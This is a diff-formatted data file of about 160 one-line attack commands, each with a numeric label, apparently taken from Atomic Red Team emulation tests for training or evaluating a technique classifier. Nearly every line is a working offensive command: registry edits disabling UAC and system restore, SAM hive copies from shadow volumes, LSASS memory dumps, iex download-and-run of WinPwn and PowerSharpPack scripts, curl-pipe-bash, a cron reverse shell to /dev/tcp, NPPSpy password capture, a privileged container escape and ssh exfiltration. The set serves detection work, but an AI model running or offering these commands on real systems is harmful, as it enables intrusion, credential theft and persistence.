@@ -1,0 +1,160 @@
+1	Remove-SmbShare -Name #{share_name};Remove-FileShare -Name #{share_name}
+4	xwd -root -out #{output_file}&&xwud -in #{output_file}
+6	1..#{limit} | % { ; try { [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\#{target_hive}" , "$env:TEMP\#{target_hive}vss$_", "true") } catch {}; ls "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore;}
+1	reg add "HKLM\SOFTWARE\Microsoft\Security Center" /v UACDisableNotify /t REG_DWORD /d 1 /f
+7	evil-winrm -i #{destination_address} -u #{user_name} -p #{password}
+0	FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`&&if [ -z "${FILE}" ] ; then echo "No loginwindow plist file found" && exit 1 ; fi&&echo save backup copy to /tmp/&&cp ${FILE} /tmp/t1547007_loginwindow-backup.plist&&echo before&&plutil -p ${FILE}&&echo overwriting...&&#{exe_path} ${FILE} && echo after && plutil -p ${FILE}
+9	powershell.exe iwr -URI #{remote_file} -Outfile #{local_path}
+4	xwd -root -out #{output_file}&&xwud -in #{output_file}
+1	Start-Process "#{exe_binary}";Start-Sleep -Seconds 7;Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+3	echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+7	Enable-PSRemoting -Force
+6	"#{venv_path}\Scripts\pypykatz" live lsa 
+0	echo "#{command}" >> /var/spool/cron/crontabs/#{cron_script_name}
+1	reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+1	"#{uacme_exe}"
+1	"#{uacme_exe}"
+1	conhost.exe "#{process}"
+9	cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nimgrab.exe" #{remote_file} #{destination_path}
+1	setfile -a V #{filename}
+3	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');itm4nprivesc -noninteractive -consoleoutput
+1	truncate -s +1 #{file_to_pad} #adds a byte to the file size
+5	Import-Module "#{ps_module}";Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
+1	"#{uacme_exe}"
+1	pcalua.exe -a #{process};pcalua.exe -a #{payload_path}
+1	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
+9	del %TEMP%\PrintBrm.zip >nul 2>&1 ;#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE
+1	defaults write com.apple.finder AppleShowAllFiles YES
+10	vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%
+1	$file = Get-Item $env:temp\T1564.001-9.txt -Force;$file.attributes='Hidden'
+3	lsmod&&kmod list&&grep vmw /proc/modules
+1	sudo -l      &&sudo cat /usr/local/etc/sudoers&&sudo ee /usr/local/etc/sudoers
+1	reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f
+0	New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "#{dll_path}"
+8	cd /tmp&&curl -s #{remote_url} |bash&&ls -la /tmp/art.txt      
+3	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Generalrecon -consoleoutput -noninteractive
+9	del %TEMP%\redcanary.cab >nul 2>&1;#{Path_replace} #{replace_cab} %TEMP% /A
+1	New-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -ItemType Directory -ErrorAction Ignore;Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore };Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -File | ForEach-Object { Add-Content -Path $_.FullName -Value "Modification for Atomic Red Test" -ErrorAction Ignore }
+1	sudo -l      &&sudo cat /etc/sudoers&&sudo vim /etc/sudoers
+9	certreq.exe -Post -config #{remote_file} c:\windows\win.ini #{local_path}
+12	copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db;schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
+2	reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f
+4	dir #{input_file} -Recurse | Compress-Archive -DestinationPath #{output_file}
+8	[ "$(uname)" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art&&cat /etc/passwd |grep ^art&&chsh -s /bin/sh art&&cat /etc/passwd |grep ^art
+6	for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
+3	Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\T1120_collection.txt;$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\T1120_collection.txt;@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne "" } |Set-Content $env:TEMP\T1120_collection.txt
+1	mkdir ~/Library/Mail/copy&&cp -R ~/Library/Mail/* ~/Library/Mail/copy&&rm -rf ~/Library/Mail/copy/*
+6	rundll32.exe keymgr,KRShowKeyMgr
+10	net.exe stop #{service_name}
+3	driverquery /v;driverquery /si
+2	New-WebGlobalModule -Name #{module_name} -Image #{dll_path}
+8	echo $0&&if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi&&if $(printenv SHELL >/dev/null); then printenv SHELL; fi
+6	reg query HKLM /f password /t REG_SZ /s;reg query HKCU /f password /t REG_SZ /s
+1	Mount-DiskImage -ImagePath "#{path_of_iso}"
+3	echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+1	"#{uacme_exe}"
+0	net stop w32time;Copy-Item "$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_SZ /v "DllName" /d "C:\Users\Public\AtomicTest.dll" /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "Enabled" /d "1" /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpServer" /t REG_DWORD /v "InputProvider" /d "1" /f;net start w32time
+10	sc.exe stop #{service_name}
+0	cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
+3	reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v SystemBiosVersion;reg query HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System /v VideoBiosVersion
+8	chmod +x #{linenum}&&bash #{linenum}
+0	kubectl --context kind-atomic-cluster run atomic-nsenter-escape-pod --restart=Never -ti --rm --image alpine --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
+1	Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly;$keep = Get-Volume -FileSystemLabel "AllTheThings";$driveLetter = ($keep | Get-Volume).DriveLetter;$instance = [activator]::CreateInstance([type]::GetTypeFromCLSID("{c08afd90-f2a1-11d1-8455-00a0c91f3880}"));$instance.Document.Application.ShellExecute($driveLetter+":\document.lnk","",$driveLetter+":\",$null,0)
+1	mkdir /var/tmp/.hidden-directory&&echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
+1	docker build -t t1612  $PathtoAtomicsFolder/T1612/src/&&docker run --name t1612_container  -d -t t1612&&docker exec t1612_container ./test.sh
+1	attrib.exe +h #{file_to_modify}
+1	sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers&&sudo visudo -c -f /etc/sudoers
+5	tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
+6	$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore);if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id };C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
+1	"#{uacme_exe}"
+0	echo "#{command}" > /etc/cron.d/#{cron_script_name}
+3	csrutil status
+3	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Morerecon -noninteractive -consoleoutput
+8	for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done
+3	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');otherchecks -noninteractive -consoleoutput
+3	fsutil fsinfo drives
+6	reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s
+0	crontab -l > /tmp/notevil&&echo "* * * * * #{command}" > #{tmp_cron} && crontab #{tmp_cron}
+10	sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)
+3	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');printercheck -noninteractive -consoleoutput
+9	curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
+6	cmdkey /list
+8	TMPFILE=$(mktemp)&&echo "id" > $TMPFILE&&bash $TMPFILE
+1	"#{uacme_exe}"
+8	cat /etc/shells 
+1	New-Item #{commandpath} -Force | Out-Null;New-ItemProperty -Path #{commandpath} -Name "DelegateExecute" -Value "" -Force | Out-Null;Set-ItemProperty -Path #{commandpath} -Name "(default)" -Value "#{commandtorun}" -Force -ErrorAction SilentlyContinue | Out-Null;$Process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
+3	wscript.exe C:\Windows\System32\gatherNetworkInfo.vbs
+0	sudo defaults write com.apple.loginwindow LoginHook #{script}
+1	dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes&&dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data&&dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
+4	import -window root #{output_file}
+0	sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}&&sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
+3	reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"
+6	"#{gsecdump_exe}" -a
+4	cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12;Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;;[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);;cmd /c "timeout #{recording_time} > NULL && psr.exe /stop"
+1	xattr -lr * / 2>&1 /dev/null | grep -C 2 "00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00"
+10	taskkill.exe /f /im #{process_name}
+1	touch /var/tmp/T1564.001_mac.txt&&chflags hidden /var/tmp/T1564.001_mac.txt
+6	C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*;C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*;C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
+8	export ART='echo "Atomic Red Team was here... T1059.004"'&&echo $ART |/bin/sh
+1	"#{uacme_exe}"
+1	sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"&&sudo visudo -c -f /etc/sudoers
+1	net share #{share_name} /delete
+1	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique magic
+6	C:\Windows\System32\inetsrv\appcmd.exe list apppool /config
+3	cscript "#{vbscript}"
+3	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');RBCD-Check -consoleoutput -noninteractive
+10	reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f;reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f;reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f
+1	"#{file_path}"
+6	& "#{petitpotam_path}" #{captureServerIP} #{targetServerIP} #{efsApi};Write-Host "End of PetitPotam attack"
+3	wmic cpu get name;wmic MEMPHYSICAL get MaxCapacity;wmic baseboard get product;wmic baseboard get version;wmic bios get SMBIOSBIOSVersion;wmic path win32_VideoController get name;wmic path win32_VideoController get DriverVersion;wmic path win32_VideoController get VideoModeDescription;wmic OS get Caption,OSArchitecture,Version;wmic DISKDRIVE get Caption;Get-WmiObject win32_bios
+3	set
+1	New-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -ItemType Directory -ErrorAction Ignore;Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore };Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore
+1	for %i in (C$ IPC$ ADMIN$) do net share %i /delete
+2	reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level" /t REG_DWORD /d 1 /f;mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1;echo "Atomic Red Team TEST" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
+1	Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly;$keep = Get-Volume -FileSystemLabel "TestIso";$driveLetter = ($keep | Get-Volume).DriveLetter;invoke-item "$($driveLetter):\hello.exe"
+9	del %TEMP%\redcanary.cab >nul 2>&1;#{Path_replace} "#{replace_cab}" %TEMP% /A
+1	mkdir -p /var/spool/mail/copy&&for file in /var/spool/mail/*; do&&  if [ "$(basename "$file")" != "copy" ]&&  then&&    cp -R "$file" /var/spool/mail/copy/&&    if [ -f "/var/spool/mail/copy/$(basename "$file")" ]; then&&      echo "Modification for Atomic Red Test" >> "/var/spool/mail/copy/$(basename "$file")"&&    fi&&  fi&&done
+3	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');Invoke-Seatbelt -Command "-group=all"; pause
+1	sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers&&sudo visudo -c -f /usr/local/etc/sudoers
+4	Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("#{output_file}")
+0	if [ ! -d #{mount_point} ]; then mkdir #{mount_point} ; mount #{mount_device} #{mount_point}; fi&&echo -n "* * * * * root /bin/bash -c '/bin/bash -c echo \"\"; echo \"hello from host! " > #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "(hostname) " >> #{mount_point}#{cron_path}/#{cron_filename}&&echo -n "$" >> #{mount_point}#{cron_path}/#{cron_filename}&&echo "(id)\" >& /dev/tcp/#{listen_address}/#{listen_port} 0>&1'" >> #{mount_point}#{cron_path}/#{cron_filename}&&netcat -l -p #{listen_port} 2>&1
+3	Import-Module "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1" -force      ;$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password;Connect-AzAccount -Credential $Credential;Connect-AzureAD -Credential $Credential;Scan-AzureAdmins -UseCurrentCred
+11	Get-CimInstance -Query "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"
+6	esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
+3	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');winPEAS -noninteractive -consoleoutput
+6	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');samfile -consoleoutput -noninteractive  
+0	echo "#{command}" > /etc/cron.daily/#{cron_script_name}&&echo "#{command}" > /etc/cron.hourly/#{cron_script_name}&&echo "#{command}" > /etc/cron.monthly/#{cron_script_name}&&echo "#{command}" > /etc/cron.weekly/#{cron_script_name}
+1	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp
+0	if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
+1	Start-Process "#{exe_binary}";Start-Sleep -Seconds 7;Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+1	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 0 /f;reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 0 /f
+8	[ "$(uname)" = 'FreeBSD' ] && encodecmd="b64encode -r -" && decodecmd="b64decode -r" || encodecmd="base64 -w 0" && decodecmd="base64 -d"&&ART=$(echo -n "id" | $encodecmd)&&echo "\$ART=$ART"&&echo -n "$ART" | $decodecmd |/bin/bash&&unset ART
+7	Enable-PSRemoting -Force;Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
+1	sudo sh -c "echo Defaults "'!'"tty_tickets >> /usr/local/etc/sudoers"&&sudo visudo -c -f /usr/local/etc/sudoers
+3	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1');Invoke-watson
+1	$orgValue =(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin;Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force
+6	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1');Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true"
+1	"#{uacme_exe}"
+3	env
+0	echo "#{at_command}" | at #{time_spec}
+3	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');oldchecks -noninteractive -consoleoutput
+6	Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32";$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER;$UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy";Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue;$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore;$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore;$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore;$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore;$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore;echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
+1	Set-ExecutionPolicy -Scope Process Bypass -Force;$owners = @{};gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}};& "$PathToAtomicsFolder\T1134.002\src\GetToken.ps1"; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+6	Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green;Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1";Invoke-PowerDump
+1	mkdir -p /var/spool/mail/copy&&for file in /var/spool/mail/*; do&&  if [ "$(basename "$file")" != "copy" ]&&  then&&    cp -R "$file" /var/spool/mail/copy/&&  fi&&done&&rm -rf /var/spool/mail/copy/*
+9	wscript.exe "#{vbscript_file}"
+1	$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\cmd.exe" -technique DiskCleanup
+2	%windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path}
+3	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');Invoke-SharpUp -command "audit"
+1	mkdir ~/Library/Mail/copy&&cp -R ~/Library/Mail/* ~/Library/Mail/copy&&echo "Manipulated data" > ~/Library/Mail/copy/manipulated.txt
+1	forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
+1	net use c: #{share_name};net share test=#{share_name} /REMARK:"test share" /CACHE:No
+3	kldstat&&kldstat | grep vmm
+1	iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')
+1	attrib.exe +s #{file_to_modify}
+0	at 13:20 /interactive cmd
+1	Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
+1	$file = Get-Item $env:temp\T1564.001-10.txt -Force;$file.attributes='System'
+1	Unblock-File -Path #{file_path}
+8	uname -srm
+4	import -window root #{output_file}
